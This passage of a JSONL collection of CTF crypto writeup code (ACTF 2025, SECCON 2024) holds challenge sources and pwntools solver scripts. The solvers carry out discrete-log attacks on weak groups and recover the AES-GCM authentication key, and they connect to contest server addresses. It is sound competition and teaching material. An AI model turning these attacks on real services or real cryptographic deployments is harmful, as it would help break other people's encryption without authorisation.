-1, -1, 0, 0, -1, 1, -1, 0, 1, 1, 1, 1, 0, -1, 1, 1, 1, 0, -1, 1, -1, 1, 1, 0, -1, 0, 0, 1, 1, 1, 0, -1, 1, 1, 1, -1, 0, 0, 1, -1, -1, 0, 0, 1, 1, 1, 1, 1, -1, -1, 0, -1, 0, 1, 0, -1, -1, -1, -1, 1, 0, 1, 1, -1, 0, 0, -1, -1, 1, 0, 1, -1, -1, -1, -1, 1, -1, -1, 0, -1, -1, 1)\nassert len(sol) == 450\n\nsol1 = [num % p for num in sol]\nsol2 = [-num % p for num in sol]\n\nkey = md5(str(list(sol2)).encode()).digest()\naes = AES.new(key = key, mode = AES.MODE_ECB)\nct = b'\"\\xf2Y\\xf0\\x15\\xc5x\\x94\\xb9E\\xbd\\xd3\\xa7\\xb1\\xad\\x00\\xa2D*+\\x87BQ_20\\x87\\xa2\\nP\\xfc\\xce\\x0eW\\xaf\\xd8-.\\xb5\\xfai\\xf1\\xf6*\\xben^\\xd5'\nprint(aes.decrypt(ct))", "name": "get_flag"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\ACTF\\easy-log\\easy_log.py", "category": "crypto", "solution_code": "from Crypto.Util.number import long_to_bytes, bytes_to_long, isPrime\nfrom os import urandom\nfrom random import randint\nfrom collections import namedtuple\nfrom signal import alarm\n\nPoint = namedtuple(\"Point\", \"x y\")\nO = \"Origin\"\n\ndef point_addition(P, Q, n):\n\tif P == O:\n\t\treturn Q\n\tif Q == O:\n\t\treturn P\n\tx = (P.x * Q.y + P.y * Q.x - P.x * Q.x) % n\n\ty = (P.x * Q.x + P.y * Q.y) % n\n\treturn Point(x, y)\n\t\ndef double_and_add(k, P, n):\n\tQ = P\n\tR = O\n\twhile(k > 0):\n\t\tif k & 1:\n\t\t\tR = point_addition(R, Q, n)\n\t\tk >>= 1\n\t\tQ = point_addition(Q, Q, n)\n\treturn R\n\nwith open(\"flag.txt\", \"rb\") as f:\n\tflag = f.read()\n\nassert len(flag) == 50\nflag = urandom(randint(38, 48)) + flag\nflag = flag + urandom(118 - len(flag))\n\nflag1, flag2 = bytes_to_long(flag[:68]), bytes_to_long(flag[68:])\n\nn = 0x231d5fa471913e79facfd95e9b874e2d499def420e0914fab5c9f87e71c2418d1194066bd8376aa8f02ef35c1926f73a46477cd4a88beae89ba575bb3e1b04271426c6706356dd8cd9aa742d7ad0343f8939bfd2110d45122929d29dc022da26551e1ed7000\nG1 = Point(0xf22b9343408c5857048a19150c8fb9fd44c25d7f6decabc10bf46a2250a128f0df15adc7b82c70c0acaf855c0e898b141c9c94ba8aef8b67ea298c6d9fd870ea70e1c4f8a1b595d15373dc6db25a4ecddf626a64f47beba5538b7f733e4aa0c4f1fd4c291d, 0x8d3264514b7fdbce97fbaedb33120c7889a1af59691a1947c2c7061347c091b0950ca36efaa704514004a988b9b87b24f5cebf2d1c7bef44ff172519e1a62eb62cde234c94bd0ab39375d7ddb42e044090c8db46d3f965ef7e4753bc41dac3b8b3ae0cdb57)\nG2 = Point(0x81919777837d3e5065c6f7f6801fe29544180be9db2137f075f53ebb3307f917183c6fc9cdfc5d75977f7, 0xd1a586d6848caa3a5436a86d903516d83808ce2fa49c5fb3f183ecb855e961c7e816a7ba8f588ef947f19)\n\nf1 = double_and_add(flag1, G1, n)\n\nprint(f1)\n\nalarm(30)\n\nif flag1 != int(input()):\n\texit()\n\np = int(input())\n\nassert isPrime(p) and p.bit_length() == 400\n\nf2 = double_and_add(flag2, G2, p)\n\nprint(f2)", "name": "easy_log"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\ACTF\\easy-log\\exp.py", "category": "crypto", "solution_code": "from pwn import remote, process\nfrom sage.all import GF, lcm, discrete_log, crt\nfrom collections import namedtuple\nimport re\nimport subprocess\n\nclass Point(namedtuple(\"Point\", \"x y\")):\n    # re-implement Point for ease of use in discrete_log\n    __slots__ = () \n    def is_zero(self):\n        return self.x == 0 and self.y == 1\n\n# this is actually the identity element in this group\nO = Point(0, 1)\nn = 0x231d5fa471913e79facfd95e9b874e2d499def420e0914fab5c9f87e71c2418d1194066bd8376aa8f02ef35c1926f73a46477cd4a88beae89ba575bb3e1b04271426c6706356dd8cd9aa742d7ad0343f8939bfd2110d45122929d29dc022da26551e1ed7000\nG1 = Point(0xf22b9343408c5857048a19150c8fb9fd44c25d7f6decabc10bf46a2250a128f0df15adc7b82c70c0acaf855c0e898b141c9c94ba8aef8b67ea298c6d9fd870ea70e1c4f8a1b595d15373dc6db25a4ecddf626a64f47beba5538b7f733e4aa0c4f1fd4c291d, 0x8d3264514b7fdbce97fbaedb33120c7889a1af59691a1947c2c7061347c091b0950ca36efaa704514004a988b9b87b24f5cebf2d1c7bef44ff172519e1a62eb62cde234c94bd0ab39375d7ddb42e044090c8db46d3f965ef7e4753bc41dac3b8b3ae0cdb57)\nG2 = Point(0x81919777837d3e5065c6f7f6801fe29544180be9db2137f075f53ebb3307f917183c6fc9cdfc5d75977f7, 0xd1a586d6848caa3a5436a86d903516d83808ce2fa49c5fb3f183ecb855e961c7e816a7ba8f588ef947f19)\n\ndef point_addition(P, Q, n):\n\tif P == O:\n\t\treturn Q\n\tif Q == O:\n\t\treturn P\n\tx = (P.x * Q.y + P.y * Q.x - P.x * Q.x) % n\n\ty = (P.x * Q.x + P.y * Q.y) % n\n\treturn Point(x, y)\n\t\ndef double_and_add(k, P, n):\n\tQ = P\n\tR = O\n\twhile(k > 0):\n\t\tif k & 1:\n\t\t\tR = point_addition(R, Q, n)\n\t\tk >>= 1\n\t\tQ = point_addition(Q, Q, n)\n\treturn R\n\ndef inverse_point(P, n, o):\n\treturn double_and_add(o - 1, P, n)\n\ndef solve_pow(io: remote):\n    io.recvline().decode().strip()\n    data = io.recvline().decode().strip()\n    print(\"Received:\", data)\n    match = re.search(r\"hashcash -mb26 (\\w+)\", data)\n    if not match:\n        print(\"Failed to parse challenge\")\n        return None\n    \n    token = subprocess.getoutput(f\"hashcash -mb26 {match.group(1)}\")\n    token = token.strip().split(\"token: \")[-1].strip()\n    print(\"Generated token:\", token)\n    io.sendline(token.encode())\n    io.recvuntil(b\"ok\\n\")\n    \nlocal = False\nif local:\n    io = process([\"python3\", \"easy_log.py\"])\nelse:\n    io = remote(\"1.95.139.148\", 9999)\n    solve_pow(io)\n\n# 544 bits\nmods = [5**4, 15271784978279, 10714146599832792643, 222696442740376752383, 899889935029682511225429150065010811552017719005924136271659168643090431]\nos = [5**3 * 20, 15271784978278, 114792937362708591729034885900234925448, 49593705609217901538575978041198096178688, 899889935029682511225429150065010811552017719005924136271659168643090430]\nfull_order = lcm(os)\nprint(f\"Full order: {full_order} {full_order.bit_length()} bits\")\n\nQ = eval(io.recvline().decode().strip())\nprint(f\"{Q = }\")\n\ngs = [Point(G1.x % mod, G1.y % mod) for mod in mods]\nqs = [Point(Q.x % mod, Q.y % mod) for mod in mods]\nrs = []\n\nfor idx in range(len(gs)):\n    rx = discrete_log(qs[idx], gs[idx], os[idx], operation = \"other\", op = lambda x, y: point_addition(x, y, mods[idx]), \n                   identity=O, inverse= lambda x: inverse_point(x, mods[idx], os[idx]), algorithm=\"rho\")\n    rs.append(rx)\n\nR = int(crt(rs, os))\n\n# approximately 531 bits, we need to brute force a few bits to find flag1\nflag1 = int(R)\nwhile flag1 + full_order <= 2**544:\n    flag1 += int(full_order)\n    flag1_bytes = flag1.to_bytes(68, \"big\")\n    if b\"flag\" in flag1_bytes or b\"ACTF\" in flag1_bytes:\n        print(flag1_bytes)\n        break\n\nio.sendline(str(flag1).encode())\n# smooth prime\np = 2219022262563817845601233887142124809519397622843764993025777505315744485194120997284413295120744840338461136718631385841\nio.sendline(str(p).encode())\nQ = eval(io.recvline().decode().strip())\nG = Point(0x81919777837d3e5065c6f7f6801fe29544180be9db2137f075f53ebb3307f917183c6fc9cdfc5d75977f7 % p, 0xd1a586d6848caa3a5436a86d903516d83808ce2fa49c5fb3f183ecb855e961c7e816a7ba8f588ef947f19 % p)\n# G's order in curve mod p\ng_order = 221902226256381784560123388714212480951939762284376499302577750531574448519412099728441329512074484033846113671863138584\nrx = discrete_log(Q, G, g_order, operation = \"other\", op = lambda x, y: point_addition(x, y, p), \n                   identity=O, inverse= lambda x: inverse_point(x, p, g_order), algorithm=\"rho\")\n\n# still need to brute force a few bits\nflag2 = int(rx)\nwhile flag2 + g_order <= 2**400:\n    flag2 += g_order\n    flag2_bytes = flag2.to_bytes(50, \"big\")\n    if all(num < 128 for num in flag2_bytes[:10]):\n        print(flag2_bytes)\n        break", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\ACTF\\easy-log\\find_curve_order.py", "category": "crypto", "solution_code": "from sage.all import prod, matrix, GF, factor, lcm\nfrom collections import namedtuple\n\n\nclass Point(namedtuple(\"Point\", \"x y\")):\n    __slots__ = () \n    def is_zero(self):\n        return self.x == 0 and self.y == 1\n\nO = Point(0, 1)\n\ndef point_addition(P, Q, n):\n\tif P == O:\n\t\treturn Q\n\tif Q == O:\n\t\treturn P\n\tx = (P.x * Q.y + P.y * Q.x - P.x * Q.x) % n\n\ty = (P.x * Q.x + P.y * Q.y) % n\n\treturn Point(x, y)\n\t\ndef double_and_add(k, P, n):\n\tQ = P\n\tR = O\n\twhile(k > 0):\n\t\tif k & 1:\n\t\t\tR = point_addition(R, Q, n)\n\t\tk >>= 1\n\t\tQ = point_addition(Q, Q, n)\n\treturn R\n\n\nn = 0x231d5fa471913e79facfd95e9b874e2d499def420e0914fab5c9f87e71c2418d1194066bd8376aa8f02ef35c1926f73a46477cd4a88beae89ba575bb3e1b04271426c6706356dd8cd9aa742d7ad0343f8939bfd2110d45122929d29dc022da26551e1ed7000\nG1 = Point(0xf22b9343408c5857048a19150c8fb9fd44c25d7f6decabc10bf46a2250a128f0df15adc7b82c70c0acaf855c0e898b141c9c94ba8aef8b67ea298c6d9fd870ea70e1c4f8a1b595d15373dc6db25a4ecddf626a64f47beba5538b7f733e4aa0c4f1fd4c291d, 0x8d3264514b7fdbce97fbaedb33120c7889a1af59691a1947c2c7061347c091b0950ca36efaa704514004a988b9b87b24f5cebf2d1c7bef44ff172519e1a62eb62cde234c94bd0ab39375d7ddb42e044090c8db46d3f965ef7e4753bc41dac3b8b3ae0cdb57)\nps = [2**12, 5**4, 15271784978279, 10714146599832792643, 222696442740376752383**3, 899889935029682511225429150065010811552017719005924136271659166808024139,899889935029682511225429150065010811552017719005924136271659168643090431]\nassert prod(ps) == n\n\n# p = 5 # special case with order = 20\np = 15271784978279\np = 10714146599832792643\np = 222696442740376752383\np = 899889935029682511225429150065010811552017719005924136271659168643090431\nassert n % p == 0\n\ngen = Point(G1.x % p, G1.y % p)\norder_cads = [p - 1, p, p + 1,  p + 2, p**2 - 1, p**2, p**2 + 1, p**2 + 2]\norder_cases = [\"p - 1\", \"p\", \"p + 1\", \"p + 2\", \"p^2 - 1\", \"p^2\", \"p^2 + 1\", \"p^2 + 2\"]\nfor i, order in enumerate(order_cads):\n    if double_and_add(order, gen, p) == O:\n        print(f\"Case {order_cases[i]}, Order: {factor(order)}\")\n        break\n\n# os = [None, 5**3 * 20, 15271784978278, 114792937362708591729034885900234925448, 49593705609217901538575978041198096178688, 899889935029682511225429150065010811552017719005924136271659166808024138, 899889935029682511225429150065010811552017719005924136271659168643090430]\n# os = [None, None, None, 114792937362708591729034885900234925448, 49593705609217901538575978041198096178688, None, 899889935029682511225429150065010811552017719005924136271659168643090430]\n# full_o = lcm([5**3 * 20, 15271784978278, 114792937362708591729034885900234925448, 49593705609217901538575978041198096178688, 899889935029682511225429150065010811552017719005924136271659168643090430])\n# print(f\"Full order: {full_o} {full_o.bit_length()} bits\")", "name": "find_curve_order"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\ACTF\\easy-log\\find_prime.py", "category": "crypto", "solution_code": "from Crypto.Util.number import getPrime, isPrime\nfrom random import getrandbits\nfrom collections import namedtuple\nfrom sage.all import factor\n\nclass Point(namedtuple(\"Point\", \"x y\")):\n    __slots__ = () \n    def is_zero(self):\n        return self.x == 0 and self.y == 1\n\nO = \"Origin\"\nO = Point(0, 1)\n\ndef point_addition(P, Q, n):\n\tif P == O:\n\t\treturn Q\n\tif Q == O:\n\t\treturn P\n\tx = (P.x * Q.y + P.y * Q.x - P.x * Q.x) % n\n\ty = (P.x * Q.x + P.y * Q.y) % n\n\treturn Point(x, y)\n\t\ndef double_and_add(k, P, n):\n\tQ = P\n\tR = O\n\twhile(k > 0):\n\t\tif k & 1:\n\t\t\tR = point_addition(R, Q, n)\n\t\tk >>= 1\n\t\tQ = point_addition(Q, Q, n)\n\treturn R\n\ndef get_smooth_prime(bits, smoothness=16):\n    assert bits - 2 * smoothness > 0\n    p = 2\n    while p.bit_length() < bits - 2 * smoothness:\n        factor = getPrime(smoothness)\n        p *= factor\n\n    bitcnt = (bits - p.bit_length()) // 2\n    while True:\n        prime1 = getrandbits(bitcnt)\n        prime2 = getrandbits(bitcnt)\n        tmpp = p * prime1 * prime2\n        if tmpp.bit_length() < bits:\n            bitcnt += 1\n            continue\n        if tmpp.bit_length() > bits:\n            bitcnt -= 1\n            continue\n        if isPrime(tmpp + 1):\n            p = tmpp + 1\n            break\n    return p\n\ndef find_order(G, order, mod):\n    order_facs = factor(order)\n    for p, _ in order_facs:\n        while order % p == 0 and double_and_add(order//p, G, mod) == O:\n            order //= p\n    return order\n\np = get_smooth_prime(400, 16)\nprint(f\"p = {p} {p.bit_length()} bits\")\nG2 = Point(0x81919777837d3e5065c6f7f6801fe29544180be9db2137f075f53ebb3307f917183c6fc9cdfc5d75977f7 % p, 0xd1a586d6848caa3a5436a86d903516d83808ce2fa49c5fb3f183ecb855e961c7e816a7ba8f588ef947f19 % p)\n\nif double_and_add(p, G2, p) == G2:\n    print(\"Good prime\")\n    real_order = find_order(G2, p - 1, p)\n    print(f\"Order: {real_order} {real_order.bit_length()} bits\")\n", "name": "find_prime"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\ACTF\\OhMyTetration\\dlp_solve.py", "category": "crypto", "solution_code": "from pwn import remote\nimport re\nfrom sage.all import factor, ZZ, prod, GF, is_prime, gcd, discrete_log\n\ndef get_mod(io: remote) -> int:\n    io.sendlineafter(b\"What do you do? \", b\"1\")\n    io.recvuntil(b\"lucky number is \")\n    mod = int(io.recvline().decode().strip().split(\".\")[0])\n    return mod\n\ndef set_lucky_number(io: remote, lucky_number: int):\n    io.sendlineafter(b\"What do you do? \", b\"2\")\n    io.sendlineafter(b\"You decide to pick your own lucky number: \", str(lucky_number).encode())\n    response = io.recvline().decode().strip()\n    return \"successfully\" in response\n\ndef get_bet_ticket(io: remote, bet_size: int):\n    io.sendlineafter(b\"What do you do? \", b\"3\")\n    io.sendlineafter(b\"You decide to pick your bet size: \", str(bet_size).encode())\n    # re to extract from \"You take the ticket with the number {ticket} from the machine\"\n    response = io.recvline().decode().strip()\n    ticket = re.search(r\"number (\\d+)\", response).group(1)\n    return int(ticket)\n\ndef set_lucky_number_and_bet(io: remote, p: int, g: int, x: int, times: int):\n    io.sendlineafter(b\"What do you do? \", b\"4\")\n    io.sendlineafter(b\"I don't think the boss's lucky number is lucky enough: \", str(p).encode())\n    io.sendlineafter(b\"Yes!\\\" I whisper, overriding the preset algorithm with my own: \", str(x).encode())\n    io.sendlineafter(b\"You decide to pick your own lucky number: \", str(g).encode())\n    io.sendlineafter(b\"You decide to pick your bet size: \", str(times).encode())\n    response = io.recvline().decode().strip()\n    if \"You take the ticket with the number\" in response:\n        ticket = re.search(r\"number (\\d+)\", response).group(1)\n        return int(ticket)\n    else:\n        print(\"Error: \", response)\n        return None\n\n\nsolved_prime = {}\nsolved_subgroups = {}\nsolved_dlogs = {}\nwhile True:\n    io = remote(\"1.95.137.123\", 9999)\n    mod = get_mod(io)\n    assert is_prime(mod), \"mod is not prime\"\n    Fp = GF(mod)\n    print(\"mod:\", mod)\n    print(\"solved_prime:\", solved_prime)    \n    if mod in solved_prime:\n        io.close()\n        continue\n    solved_prime[mod] = True\n    facts = factor(mod - 1)\n    print(\"factors:\", facts)\n    sub_groups = []\n    for p, e in facts:\n        if p.bit_length() >= 50:\n            continue\n        if p not in solved_subgroups:\n            solved_subgroups[p] = e\n            sub_groups.append(p ** e)\n        elif solved_subgroups[p] < e:\n            solved_subgroups[p] = e\n            sub_groups.append(p ** e)\n    # solve the dlog for each subgroup\n    sub_order = prod(sub_groups)\n    print(\"sub_groups:\", sub_groups)\n    g = Fp.primitive_element()\n    # g_order = mod - 1\n    g_order = g.multiplicative_order()\n    g_sub0 = g ** (g_order // sub_order)\n    assert g_sub0.multiplicative_order() == sub_order\n    g_sub = None\n    for i in range(1, sub_order):\n        if gcd(i, sub_order) == 1:\n            if set_lucky_number(io, g_sub0**i):\n                g_sub = g_sub0 ** i\n                print(\"g_sub:\", g_sub, \"success\")\n                break\n    if g_sub is None:\n        print(\"Error: No good lucky number found\")\n        io.close()\n        continue\n    y_sub = get_bet_ticket(io, 1)\n    print(\"y_sub:\", y_sub)\n    order_y_sub = Fp(y_sub).multiplicative_order()\n    print(\"order_y_sub:\", order_y_sub)\n    r = discrete_log(Fp(y_sub), Fp(g_sub), ord=sub_order)\n    print(f\"x mod {sub_order} = {r}\")\n    solved_dlogs[sub_order] = r\n    print(\"solved_dlogs:\", solved_dlogs)", "name": "dlp_solve"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\ACTF\\OhMyTetration\\exp.py", "category": "crypto", "solution_code": "from pwn import remote\nimport re\nimport random\nfrom sage.all import factor, ZZ, prod, GF, is_prime, gcd, discrete_log, crt\nfrom tqdm import trange\n\ndef get_mod(io: remote) -> int:\n    io.sendlineafter(b\"What do you do? \", b\"1\")\n    io.recvuntil(b\"lucky number is \")\n    mod = int(io.recvline().decode().strip().split(\".\")[0])\n    return mod\n\ndef set_lucky_number(io: remote, lucky_number: int):\n    io.sendlineafter(b\"What do you do? \", b\"2\")\n    io.sendlineafter(b\"You decide to pick your own lucky number: \", str(lucky_number).encode())\n    response = io.recvline().decode().strip()\n    return \"successfully\" in response\n\ndef get_bet_ticket(io: remote, bet_size: int):\n    io.sendlineafter(b\"What do you do? \", b\"3\")\n    io.sendlineafter(b\"You decide to pick your bet size: \", str(bet_size).encode())\n    # re to extract from \"You take the ticket with the number {ticket} from the machine\"\n    response = io.recvline().decode().strip()\n    ticket = re.search(r\"number (\\d+)\", response).group(1)\n    return int(ticket)\n\ndef set_lucky_number_and_bet(io: remote, p: int, g: int, x: int, times: int):\n    io.sendlineafter(b\"What do you do? \", b\"4\")\n    io.sendlineafter(b\"I don't think the boss's lucky number is lucky enough: \", str(p).encode())\n    io.sendlineafter(b\"Yes!\\\" I whisper, overriding the preset algorithm with my own: \", str(x).encode())\n    io.sendlineafter(b\"You decide to pick your own lucky number: \", str(g).encode())\n    io.sendlineafter(b\"You decide to pick your bet size: \", str(times).encode())\n    response = io.recvline().decode().strip()\n    if \"You take the ticket with the number\" in response:\n        ticket = re.search(r\"number (\\d+)\", response).group(1)\n        return int(ticket)\n    else:\n        print(\"Error: \", response)\n        return None\n    \ndef subgroup_generator(p, sub_order, randomize=True):\n    assert (p-1) % sub_order == 0\n    Fp = GF(p)\n    g = Fp.primitive_element()** ((p-1) // sub_order)\n    if randomize:\n        x = random.randint(1, sub_order - 1)\n        while gcd(x, sub_order) != 1:\n            x = random.randint(1, sub_order - 1)\n        return int(g ** x)    \n    else:\n        return int(g)\n     \ndef find_target_generator(p, pp, order_base, randomize=True):\n    assert (p-1) % pp == 0 and (pp - 1) % order_base == 0\n    mod1 = int((p - 1) // pp)\n    mod2 = pp\n    r1 = 1\n    r2 = subgroup_generator(pp, order_base, randomize)\n    g = crt([r1, r2], [mod1, mod2])\n    return g\n\ngood_primes = [670144747631070976739015819027954827310379693667090873445520193836663869580245599076670148076473491050020123654751096623483807617465722698994356143777563707,\n               170953236075981703101107323627149749446399094948416530919519737926722425019602066485332700625463008928220692022155525741201814917060803040398296096589112909590796816127,\n               7531993227394432935495469175847581786870840148535987047046105838996369558316042438597087283959689643904418638897096661950504686097925188166275662098492041069,\n               35756093982019706426293639025599400558582772921867310666401488874611580043479377203647832136951529097764525162097024888170529918256990041464461134501152163496501126743211147409398847307]\ntarget_p1_factors = [954622147622608228972957007162328813832449706078477027700171216291543973761033616918333544268480756481510147656340593480746164697244619229336689663500803,\n                     85476618037990851550553661813574874723199547474208265459759868963361212509801033242666350312731504464110346011077762870600907458530401520199148048294556454795398408063,\n                     746333058600320346363007250876692606705394386497818772002190431925918505580265798513385581050306147830402163981083696190101534492461869616158904290377729,\n                     350549941000193200257780774760778436848850714920267751631387145829525294543915462780861099381877736252593383942127694982064018806441078837886873867658354544083344379835403405974498503]\n\ntarget_pp1_smooth_factors = [\n    3**320,\n    139**36 * 163**34, # base 139**36\n    2**502,\n    11**127\n]\n\nreally_small_bases = [3, 139 * 163, 2, 11]\ninc_gap = [10, 1, 16, 4]\nbases_power_ub = [320, 34, 502, 127]\nsolved_subgroups = {base: 0 for base in really_small_bases}\nsolved_dlogs = {1:0}\nfull_order =  1\n\nwhile True:\n    io = remote(\"1.95.137.123\", 9999)\n    mod = get_mod(io)\n    assert is_prime(mod), \"mod is not prime\"\n    Fp = GF(mod)\n    print(\"mod:\", mod)\n    if mod not in good_primes:\n        io.close()\n        continue\n    idx = good_primes.index(mod)\n    p = good_primes[idx]\n    pp = target_p1_factors[idx]\n    order_base = really_small_bases[idx]\n    expon0 = solved_subgroups[order_base]\n    expon1 = expon0 + inc_gap[idx]\n    mod0 = order_base**expon0\n    mod1 = order_base**expon1\n    x0 = solved_dlogs[mod0]\n    g = int(find_target_generator(p, pp, mod1))\n    while not set_lucky_number(io, g):\n        g = int(find_target_generator(p, pp, mod1))\n    assert pow(g, mod1, p - 1) == 1 \n    assert pow(g, mod1//order_base, p - 1) != 1\n    ticket = get_bet_ticke", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\ACTF\\OhMyTetration\\main.py", "category": "crypto", "solution_code": "from Crypto.Util.number import bytes_to_long\nfrom secret import LotteryCenter, FLAG\nimport signal\n\ndef handler1(signum, frame):\n    raise TimeoutError(\"You took too long to make a decision. The boss is not patient.\")\ndef handler2(signum, frame):\n    e = '''\nBefore I can react, a heavy hand clamps onto my shoulder. The boss's face is dark with rage. \"What the hell did you do?!\"\nI stammer, \"I just thought the numbers could be luckier...\"\n\"OUT!\" he roars, dragging me toward the door. \"And don't come back unless you've got the money to replace this thing!\"\n'''\n    raise TimeoutError(e)\n\nx = bytes_to_long(FLAG)\nassert x.bit_length() <= 512\n\ndescrption = \"\"\"\nYou step into the Lottery Center, the bell above the door rings softly as you enter. The air is stale, with an old fan humming above. The walls are lined with lottery posters and flashing numbers. At the counter, a middle-aged man in a dark suit is busy sorting through some papers, unaware of your presence.\n\nThe atmosphere is quiet and slightly unsettling. You glance around the room â€” a corner has an old lottery machine, still occasionally making a \"clicking\" noise. There's a poster on the wall showing today's lucky numbers, but they seem somewhat blurry.\n\"\"\"\n\nprint(descrption)\n\nlotteryCenter = LotteryCenter()\n\nmenu = \"\"\"\nYou're left with a few choices:\n1. Talk to the Boss.\n2. Pick Your Lucky Number.\n3. Choose Your Bet Size.\n4. Look Around.\n\"\"\"\n\nsignal.signal(signal.SIGALRM, handler1)\nsignal.alarm(600)\n\nwhile 1:\n    print(menu)\n    choice = input(\"What do you do? \")\n    if choice == \"1\":\n        # Choose my favourite number.\n        print(f\"You approach the counter. The boss looks up briefly, then says in a low voice, \\\"Today's lucky number is {lotteryCenter.P}. Trust it, it will bring good luck.\\\"\")\n    elif choice == \"2\":\n        g = int(input(\"You decide to pick your own lucky number: \"))\n        if lotteryCenter.defineG(g):\n            print(\"You successfully pick your lucky number.\")\n        else:\n            print(\"You can't pick that number.\")\n    elif choice == \"3\":\n        if lotteryCenter.g==None:\n            print(\"You should pick your lucky number first.\")\n        else:\n            times = int(input(\"You decide to pick your bet size: \"))\n            assert times>0\n            ticket = lotteryCenter.tetration(times, x)\n            # Calculate the tetration g^g^...^g(times)^x.\n            # For example, P=23, g=3, tetration(3, 2) = 3^(3^(3^2)) % 23 = 12.\n            print(f\"You take the ticket with the number {ticket} from the machine, feeling a slight chill in the air. The boss looks at you for a moment longer, his expression unreadable. Then, with a slow smile, he finally speaks, his voice low but clear:\")\n            print(\"\\\"Good luck... I hope today is your lucky day.\\\"\")\n            break\n    elif choice == \"4\":\n        print(\"The boss seems distracted â€” perhaps counting cash or sorting through stacks of old receipts, his back turned just enough. Seizing the moment, I slip around to the back of the lottery machine, my fingers hovering over the controls. A quiet smirk tugs at my lips as I mutter under my breath ...\")\n        lotteryCenter.P = int(input(\"I don't think the boss's lucky number is lucky enough: \"))\n        assert lotteryCenter.P>1\n        x = int(input(\"\\\"Yes!\\\" I whisper, overriding the preset algorithm with my own: \"))\n        g = int(input(\"You decide to pick your own lucky number: \"))\n        times = int(input(\"You decide to pick your bet size: \"))\n        assert times>0\n        signal.signal(signal.SIGALRM, handler2)\n        signal.alarm(10)\n        try:\n            if lotteryCenter.defineG(g):\n                ticket = lotteryCenter.tetration(times, x)\n                print(f\"You take the ticket with the number {ticket} from the machine secretly.\")\n            else:\n                print(\"Oops! The lottery machine whirs weakly as I finish tampering with its settings â€” then suddenly, the screen flickers violently before dying with a pathetic click. A thin wisp of smoke curls from the vents.\")\n        except TimeoutError as e:\n            print(e)\n        finally:\n            signal.alarm(0)\n        break\n    else:\n        print(\"Nothing here.\")\n\nprint(\"\\nYou exit the Lottery Center, the door closing softly behind you. The bell rings once more, leaving you standing outside, holding the ticket â€” unsure if you've just stepped into a stroke of luck... or something else entirely.\")", "name": "main"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\ACTF\\OhMyTetration\\server_primes_tester.py", "category": "crypto", "solution_code": "from sage.all import factor\n\nprimes = {670144747631070976739015819027954827310379693667090873445520193836663869580245599076670148076473491050020123654751096623483807617465722698994356143777563707: True, 1502305675703953507826564356364207463785905265358954425050832597353379827611347779894929874274487297076504174110953417469304402049079223143080164648064147459: True, 170953236075981703101107323627149749446399094948416530919519737926722425019602066485332700625463008928220692022155525741201814917060803040398296096589112909590796816127: True, 1079057966637328314460077867877075467713192523793597903382852641891007375448706143257181174464331232997171389558347754330749095005274030323571444891328903479: True, 7531993227394432935495469175847581786870840148535987047046105838996369558316042438597087283959689643904418638897096661950504686097925188166275662098492041069: True, 35756093982019706426293639025599400558582772921867310666401488874611580043479377203647832136951529097764525162097024888170529918256990041464461134501152163496501126743211147409398847307: True, 239187462979118019747230815457958990366061401854539190633596878790038851736407756334693453965940382959498959881612616858277374759576574603849900365838546947: True, 69733552883983886441106168440790711150895644030197258530275106690507328511836880029685067160750932842368374328059309873559063711214389833094390485760319482905397: True}\n\n# p-1 cannot be factored, factordb gives some small primes though\nunchecked = {5562154467202723270412772514830285916047384143265968574138415679850553481694361563181346260125418726789543245146122445003861314460175414039028066450148987: True, 370923153638212161920777491706333569951572574628708821969548439843124087828919574625984399791228366182810501744996329114675870804331860814331864285959146185667:True}\nfor prime in primes:\n    print(\"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\")\n    print(\"original prime:\", prime)\n    fs = factor(prime - 1)\n    print(\"factors of original prime:\", fs)\n    print()\n    for q, e in fs:\n        if q in unchecked:\n            continue\n        print(f\"{q = }\")\n        print(\"factors of q-1: \", factor(q - 1))\n        print()", "name": "server_primes_tester"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\SECCON-Qual\\dual_summon\\exp.py", "category": "crypto", "solution_code": "from pwn import remote, process, info\nfrom sage.all import GF\n\n\nx = GF(2)[\"x\"].gen()\ngf2e = GF(2 ** 128, name=\"y\", modulus=x ** 128 + x ** 7 + x ** 2 + x + 1)\n\n\n# Converts an integer to a gf2e element, little endian.\ndef _to_gf2e(n):\n    return gf2e([(n >> i) & 1 for i in range(127, -1, -1)])\n\n# Converts a gf2e element to an integer, little endian.\ndef _from_gf2e(p):\n    n = p.integer_representation()\n    ans = 0\n    for i in range(128):\n        ans <<= 1\n        ans |= ((n >> i) & 1)\n    return int(ans)\n\n# nc dual-summon.seccon.games 2222\nlocal = False\nif local:\n    io = process(['python3', 'server.py'])\nelse:\n    io = remote('dual-summon.seccon.games', 2222)\n\npt1 = b\"\\x00\"*16\npt2 = b\"\\x00\"*15 + b\"\\x01\"\np1 = _to_gf2e(int.from_bytes(pt1, 'big'))\np2 = _to_gf2e(int.from_bytes(pt2, 'big'))\n# gcm length block\nl = _to_gf2e(((8 * 0) << 64) | (8 * 16))\n\ndef summon_oracle(io: remote, number:int, name:bytes):\n    io.sendlineafter(b\"[1] summon, [2] dual summon >\", b'1')\n    io.sendlineafter('>', str(number).encode())\n    io.sendlineafter('>', name.hex().encode())\n    io.recvuntil(b'tag(hex) = ')\n    tag = io.recvline().strip().decode()\n    return bytes.fromhex(tag)\n\ndef leak_H_key(io: remote, number: int = 1):\n    # leak H_key\n    tag1 = summon_oracle(io, number, pt1)\n    tag2 = summon_oracle(io, number, pt2)\n    t1 = _to_gf2e(int.from_bytes(tag1, 'big'))\n    t2 = _to_gf2e(int.from_bytes(tag2, 'big'))\n    h_square = (t1 - t2) / (p1 - p2)\n    h = h_square.sqrt()\n    return h, t1, t2\n\n# h1^2 p + h1 * l + c1 = h2^2 p + h2 * l + c2\nh1, t11, t12 = leak_H_key(io, 1)\nh2, t21, t22 = leak_H_key(io, 2)\n# delta = t11 - t21\n# = h1 * l + c1  - h2 * l - c2  + h1^2 p - h2^2 